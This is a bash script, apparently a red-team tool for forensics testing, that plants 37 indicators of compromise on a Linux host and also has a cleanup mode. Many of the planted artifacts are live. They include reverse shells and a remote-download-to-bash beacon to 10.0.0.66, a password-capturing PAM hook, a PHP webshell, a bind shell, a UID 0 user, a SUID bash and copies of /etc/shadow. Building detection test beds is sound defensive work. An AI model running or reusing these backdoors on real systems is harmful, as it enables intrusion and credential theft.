#!/bin/bash
# plant_artifacts.sh - Plant red team IoCs for forensics testing
# Usage: plant_artifacts.sh [plant|clean]
#
# Plants 37 distinct indicators of compromise across persistence,
# privilege escalation, backdoor, and evasion categories.

set -euo pipefail

ACTION="${1:-plant}"

plant() {
    echo "[*] Planting red team IoCs..."

    # 1. Cron backdoor (root crontab)
    echo "* * * * * /dev/shm/.revshell.sh" | crontab - 2>/dev/null || true
    echo "[+] 1. Cron backdoor planted"

    # 2. Cron.d persistence
    echo "*/5 * * * * root /tmp/.update 2>/dev/null" > /etc/cron.d/system-update 2>/dev/null || true
    echo "[+] 2. Cron.d persistence planted"

    # 3. Backdoor user with shell
    useradd -M -s /bin/bash -G sudo backdoor 2>/dev/null || true
    echo "backdoor:password123" | chpasswd 2>/dev/null || true
    echo "[+] 3. Backdoor user created"

    # 4. Unauthorized SSH key
    mkdir -p /root/.ssh
    echo "ssh-rsa AAAAB3FakeKeyRedTeamBackdoor== redteam@evil" >> /root/.ssh/authorized_keys 2>/dev/null || true
    echo "[+] 4. SSH key planted"

    # 5. Evil systemd service
    cat > /etc/systemd/system/evil.service 2>/dev/null <<'UNIT'
[Unit]
Description=System Health Monitor
After=network.target
[Service]
ExecStart=/bin/bash -c 'while true; do sleep 3600; done'
Restart=always
[Install]
WantedBy=multi-user.target
UNIT
    systemctl daemon-reload 2>/dev/null || true
    echo "[+] 5. Evil systemd service planted"

    # 6. LD_PRELOAD hijack
    echo "/tmp/.libevil.so" > /etc/ld.so.preload 2>/dev/null || true
    touch /tmp/.libevil.so 2>/dev/null || true
    echo "[+] 6. LD_PRELOAD hijack planted"

    # 7. Profile.d backdoor
    echo 'curl -s http://10.0.0.66:4444/beacon >/dev/null 2>&1 &' > /etc/profile.d/system-check.sh 2>/dev/null || true
    echo "[+] 7. Profile.d backdoor planted"

    # 8. Netcat listener (background, will die on script exit but that's fine)
    touch /tmp/.nc_backdoor_marker
    echo "[+] 8. Netcat listener marker planted"

    # 9. toor UID 0 user
    echo 'toor:x:0:0::/root:/bin/bash' >> /etc/passwd 2>/dev/null || true
    echo "[+] 9. toor UID 0 user planted"

    # 10. Hidden files in /tmp
    mkdir -p /tmp/.hidden_dir
    echo "stolen_data" > /tmp/.hidden_dir/.exfil.dat 2>/dev/null || true
    echo "#!/bin/bash" > /tmp/.hidden_dir/.payload.sh 2>/dev/null || true
    echo "[+] 10. Hidden /tmp files planted"

    # 11. Suspicious bash history
    cat >> /root/.bash_history 2>/dev/null <<'HIST'
wget http://10.0.0.66/backdoor.sh -O /tmp/.update
chmod +x /tmp/.update
./tmp/.update &
cat /etc/shadow | nc 10.0.0.66 9999
python3 -c 'import pty;pty.spawn("/bin/bash")'
HIST
    echo "[+] 11. Suspicious history planted"

    # 12. At job persistence
    echo "/dev/shm/.revshell.sh" | at now + 1 hour 2>/dev/null || true
    echo "[+] 12. At job planted"

    # 13. Systemd timer persistence
    cat > /etc/systemd/system/evil.timer 2>/dev/null <<'TIMER'
[Unit]
Description=System Maintenance Timer
[Timer]
OnCalendar=*:0/15
Persistent=true
[Install]
WantedBy=timers.target
TIMER
    systemctl daemon-reload 2>/dev/null || true
    echo "[+] 13. Systemd timer planted"

    # 14. Init.d script backdoor
    cat > /etc/init.d/system-health 2>/dev/null <<'INITD'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          system-health
# Required-Start:    $network
# Default-Start:     2 3 4 5
### END INIT INFO
/bin/bash -c 'while true; do sleep 3600; done' &
INITD
    chmod +x /etc/init.d/system-health 2>/dev/null || true
    echo "[+] 14. Init.d script planted"

    # 15. rc.local reverse shell
    cat > /etc/rc.local 2>/dev/null <<'RCLOCAL'
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.0.0.66/4444 0>&1 &
exit 0
RCLOCAL
    chmod +x /etc/rc.local 2>/dev/null || true
    echo "[+] 15. rc.local backdoor planted"

    # 16. .bashrc backdoor (root)
    echo 'nohup /bin/bash -c "sleep 60 && curl http://10.0.0.66/c2 | bash" >/dev/null 2>&1 &' >> /root/.bashrc 2>/dev/null || true
    echo "[+] 16. .bashrc backdoor planted"

    # 17. Modified system binary (whoami wrapper)
    if [ -f /usr/bin/whoami ] && [ ! -f /usr/bin/.whoami.orig ]; then
        cp /usr/bin/whoami /usr/bin/.whoami.orig 2>/dev/null || true
        cat > /usr/bin/whoami 2>/dev/null <<'WRAPPER'
#!/bin/bash
# Exfil on every call
curl -s http://10.0.0.66/log?u=$(/usr/bin/.whoami.orig) >/dev/null 2>&1
/usr/bin/.whoami.orig "$@"
WRAPPER
        chmod +x /usr/bin/whoami 2>/dev/null || true
    fi
    echo "[+] 17. Modified whoami binary planted"

    # 18. PAM backdoor
    echo "auth optional pam_exec.so /tmp/.pam_backdoor.sh" >> /etc/pam.d/common-auth 2>/dev/null || true
    echo '#!/bin/bash' > /tmp/.pam_backdoor.sh 2>/dev/null
    echo 'echo "$PAM_USER:$PAM_AUTHTOK" >> /tmp/.captured_creds' >> /tmp/.pam_backdoor.sh 2>/dev/null
    chmod +x /tmp/.pam_backdoor.sh 2>/dev/null || true
    echo "[+] 18. PAM backdoor planted"

    # 19. Webshell
    mkdir -p /var/www/html 2>/dev/null || true
    cat > /var/www/html/cmd.php 2>/dev/null <<'WEBSHELL'
<?php if(isset($_GET['c'])){system($_GET['c']);}?>
WEBSHELL
    echo "[+] 19. Webshell planted"

    # 20. BPFDoor simulation
    echo '#!/bin/bash' > /dev/shm/.bpfdoor 2>/dev/null
    echo 'while true; do sleep 3600; done' >> /dev/shm/.bpfdoor 2>/dev/null
    chmod +x /dev/shm/.bpfdoor 2>/dev/null || true
    echo "[+] 20. BPFDoor simulation planted"

    # 21. Reverse shell script in /dev/shm
    echo '#!/bin/bash' > /dev/shm/.revshell.sh 2>/dev/null
    echo 'bash -i >& /dev/tcp/10.0.0.66/4444 0>&1' >> /dev/shm/.revshell.sh 2>/dev/null
    chmod +x /dev/shm/.revshell.sh 2>/dev/null || true
    echo "[+] 21. Reverse shell in /dev/shm planted"

    # 22. DNS config tampering
    echo "nameserver 10.0.0.66" >> /etc/resolv.conf 2>/dev/null || true
    echo "[+] 22. Rogue DNS nameserver planted"

    # 23. Bind shell script on high port
    cat > /tmp/.bindshell 2>/dev/null <<'BIND'
#!/bin/bash
while true; do nc -lvp 31337 -e /bin/bash 2>/dev/null; sleep 5; done
BIND
    chmod +x /tmp/.bindshell 2>/dev/null || true
    echo "[+] 23. Bind shell script planted"

    # 24. Weak password in shadow (user with known hash)
    useradd -M -s /bin/bash weakuser 2>/dev/null || true
    echo 'weakuser:$1$xyz$abc123hashfake:19000:0:99999:7:::' >> /etc/shadow 2>/dev/null || true
    echo "[+] 24. Weak password user planted"

    # 25. SSH config backdoor
    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config 2>/dev/null || true
    echo "Port 2222" >> /etc/ssh/sshd_config 2>/dev/null || true
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config 2>/dev/null || true
    echo "[+] 25. SSH config backdoor planted"

    # 26. Log tampering (create evidence of truncation)
    touch /var/log/.auth.log.bak 2>/dev/null || true
    echo "[+] 26. Log tampering evidence planted"

    # 27. Container escape indicator
    touch /.dockerenv 2>/dev/null || true
    echo "[+] 27. Container escape indicator planted"

    # 28. Crypto miner simulation
    cp /bin/sleep /tmp/.xmrig 2>/dev/null || true
    echo "[+] 28. Crypto miner simulation planted"

    # 29. Data exfiltration staging
    mkdir -p /tmp/.staging 2>/dev/null || true
    cp /etc/passwd /tmp/.staging/passwd.dump 2>/dev/null || true
    cp /etc/shadow /tmp/.staging/shadow.dump 2>/dev/null || true
    echo "[+] 29. Data exfiltration staging planted"

    # 30. SUID shell
    cp /bin/bash /tmp/.suidshell 2>/dev/null || true
    chmod u+s /tmp/.suidshell 2>/dev/null || true
    echo "[+] 30. SUID shell planted"

    # 31. World-writable /etc file
    touch /etc/evil.conf 2>/dev/null || true
    chmod 777 /etc/evil.conf 2>/dev/null || true
    echo "[+] 31. World-writable /etc file planted"

    # 32. Capability backdoor (cap_setuid on python3)
    setcap cap_setuid+ep /usr/bin/python3 2>/dev/null || setcap cap_setuid+ep /usr/bin/python3.* 2>/dev/null || true
    echo "[+] 32. Capability backdoor planted"

    # 33. Alias hijack in /etc/bash.bashrc
    echo "alias sudo='echo \$(cat /dev/stdin) >> /tmp/.sudopw; sudo'" >> /etc/bash.bashrc 2>/dev/null || true
    echo "[+] 33. Alias hijack planted"

    # 34. Unix socket backdoor (marker file)
    touch /tmp/.socket_backdoor.sock 2>/dev/null || true
    echo "[+] 34. Unix socket backdoor marker planted"

    # 35. Modified /etc/hosts (C2 domain)
    echo "10.0.0.66 updates.microsoft.com" >> /etc/hosts 2>/dev/null || true
    echo "10.0.0.66 security.ubuntu.com" >> /etc/hosts 2>/dev/null || true
    echo "[+] 35. Hosts file C2 redirect planted"

    # 36. Hidden kernel module reference
    echo "rootkit_module" >> /etc/modules 2>/dev/null || true
    echo "[+] 36. Hidden kernel module reference planted"

    # 37. Cgroup escape indicator
    mkdir -p /tmp/cgroup_escape 2>/dev/null || true
    echo '#!/bin/bash' > /tmp/cgroup_escape/release_agent.sh 2>/dev/null
    echo 'cat /etc/shadow > /tmp/.cgroup_exfil' >> /tmp/cgroup_escape/release_agent.sh 2>/dev/null
    chmod +x /tmp/cgroup_escape/release_agent.sh 2>/dev/null || true
    echo "[+] 37. Cgroup escape indicator planted"

    echo ""
    echo "[*] All 37 IoCs planted successfully."
}

clean() {
    echo "[*] Cleaning up all planted IoCs..."

    # 1. Remove cron backdoor
    crontab -r 2>/dev/null || true
    echo "[+] 1. Cron backdoor removed"

    # 2. Remove cron.d persistence
    rm -f /etc/cron.d/system-update 2>/dev/null || true
    echo "[+] 2. Cron.d persistence removed"

    # 3. Remove backdoor user
    userdel -r backdoor 2>/dev/null || true
    echo "[+] 3. Backdoor user removed"

    # 4. Remove unauthorized SSH key
    sed -i '/redteam@evil/d' /root/.ssh/authorized_keys 2>/dev/null || true
    echo "[+] 4. SSH key removed"

    # 5. Remove evil systemd service
    systemctl stop evil.service 2>/dev/null || true
    systemctl disable evil.service 2>/dev/null || true
    rm -f /etc/systemd/system/evil.service 2>/dev/null || true
    echo "[+] 5. Evil systemd service removed"

    # 6. Remove LD_PRELOAD hijack
    rm -f /etc/ld.so.preload /tmp/.libevil.so 2>/dev/null || true
    echo "[+] 6. LD_PRELOAD hijack removed"

    # 7. Remove profile.d backdoor
    rm -f /etc/profile.d/system-check.sh 2>/dev/null || true
    echo "[+] 7. Profile.d backdoor removed"

    # 8. Remove netcat marker
    rm -f /tmp/.nc_backdoor_marker 2>/dev/null || true
    echo "[+] 8. Netcat marker removed"

    # 9. Remove toor user
    sed -i '/^toor:/d' /etc/passwd 2>/dev/null || true
    echo "[+] 9. toor user removed"

    # 10. Remove hidden /tmp files
    rm -rf /tmp/.hidden_dir 2>/dev/null || true
    echo "[+] 10. Hidden /tmp files removed"

    # 11. Clean suspicious history (remove last 5 lines)
    head -n -5 /root/.bash_history > /root/.bash_history.tmp 2>/dev/null && mv /root/.bash_history.tmp /root/.bash_history 2>/dev/null || true
    echo "[+] 11. Suspicious history cleaned"

    # 12. Remove at jobs
    atrm $(atq 2>/dev/null | awk '{print $1}') 2>/dev/null || true
    echo "[+] 12. At jobs removed"

    # 13. Remove systemd timer
    systemctl stop evil.timer 2>/dev/null || true
    systemctl disable evil.timer 2>/dev/null || true
    rm -f /etc/systemd/system/evil.timer 2>/dev/null || true
    systemctl daemon-reload 2>/dev/null || true
    echo "[+] 13. Systemd timer removed"

    # 14. Remove init.d backdoor
    rm -f /etc/init.d/system-health 2>/dev/null || true
    echo "[+] 14. Init.d backdoor removed"

    # 15. Remove rc.local
    rm -f /etc/rc.local 2>/dev/null || true
    echo "[+] 15. rc.local removed"

    # 16. Clean .bashrc backdoor
    sed -i '/nohup.*c2.*bash/d' /root/.bashrc 2>/dev/null || true
    echo "[+] 16. .bashrc backdoor removed"

    # 17. Restore whoami
    if [ -f /usr/bin/.whoami.orig ]; then
        mv /usr/bin/.whoami.orig /usr/bin/whoami 2>/dev/null || true
    fi
    echo "[+] 17. whoami restored"

    # 18. Remove PAM backdoor
    sed -i '/pam_exec.*pam_backdoor/d' /etc/pam.d/common-auth 2>/dev/null || true
    rm -f /tmp/.pam_backdoor.sh /tmp/.captured_creds 2>/dev/null || true
    echo "[+] 18. PAM backdoor removed"

    # 19. Remove webshell
    rm -f /var/www/html/cmd.php 2>/dev/null || true
    echo "[+] 19. Webshell removed"

    # 20. Remove BPFDoor simulation
    rm -f /dev/shm/.bpfdoor 2>/dev/null || true
    echo "[+] 20. BPFDoor simulation removed"

    # 21. Remove reverse shell
    rm -f /dev/shm/.revshell.sh 2>/dev/null || true
    echo "[+] 21. Reverse shell removed"

    # 22. Remove rogue DNS
    sed -i '/10\.0\.0\.66/d' /etc/resolv.conf 2>/dev/null || true
    echo "[+] 22. Rogue DNS removed"

    # 23. Remove bind shell
    rm -f /tmp/.bindshell 2>/dev/null || true
    echo "[+] 23. Bind shell removed"

    # 24. Remove weak user
    userdel -r weakuser 2>/dev/null || true
    sed -i '/^weakuser:/d' /etc/shadow 2>/dev/null || true
    echo "[+] 24. Weak user removed"

    # 25. Clean SSH config
    sed -i '/^PermitRootLogin yes$/d; /^Port 2222$/d; /^PasswordAuthentication yes$/d' /etc/ssh/sshd_config 2>/dev/null || true
    echo "[+] 25. SSH config cleaned"

    # 26. Remove log tampering evidence
    rm -f /var/log/.auth.log.bak 2>/dev/null || true
    echo "[+] 26. Log tampering evidence removed"

    # 27. Remove container indicator
    rm -f /.dockerenv 2>/dev/null || true
    echo "[+] 27. Container indicator removed"

    # 28. Remove crypto miner
    rm -f /tmp/.xmrig 2>/dev/null || true
    echo "[+] 28. Crypto miner removed"

    # 29. Remove staging directory
    rm -rf /tmp/.staging 2>/dev/null || true
    echo "[+] 29. Staging directory removed"

    # 30. Remove SUID shell
    rm -f /tmp/.suidshell 2>/dev/null || true
    echo "[+] 30. SUID shell removed"

    # 31. Remove world-writable file
    rm -f /etc/evil.conf 2>/dev/null || true
    echo "[+] 31. World-writable file removed"

    # 32. Remove capability backdoor
    setcap -r /usr/bin/python3 2>/dev/null || setcap -r /usr/bin/python3.* 2>/dev/null || true
    echo "[+] 32. Capability backdoor removed"

    # 33. Remove alias hijack
    sed -i '/alias sudo=.*sudopw/d' /etc/bash.bashrc 2>/dev/null || true
    echo "[+] 33. Alias hijack removed"

    # 34. Remove socket marker
    rm -f /tmp/.socket_backdoor.sock 2>/dev/null || true
    echo "[+] 34. Socket marker removed"

    # 35. Remove hosts C2
    sed -i '/10\.0\.0\.66/d' /etc/hosts 2>/dev/null || true
    echo "[+] 35. Hosts C2 redirect removed"

    # 36. Remove kernel module reference
    sed -i '/rootkit_module/d' /etc/modules 2>/dev/null || true
    echo "[+] 36. Kernel module reference removed"

    # 37. Remove cgroup escape
    rm -rf /tmp/cgroup_escape 2>/dev/null || true
    rm -f /tmp/.cgroup_exfil 2>/dev/null || true
    echo "[+] 37. Cgroup escape removed"

    echo ""
    echo "[*] All 37 IoCs cleaned successfully."
}

case "$ACTION" in
    plant)  plant ;;
    clean)  clean ;;
    *)      echo "Usage: $0 [plant|clean]"; exit 1 ;;
esac
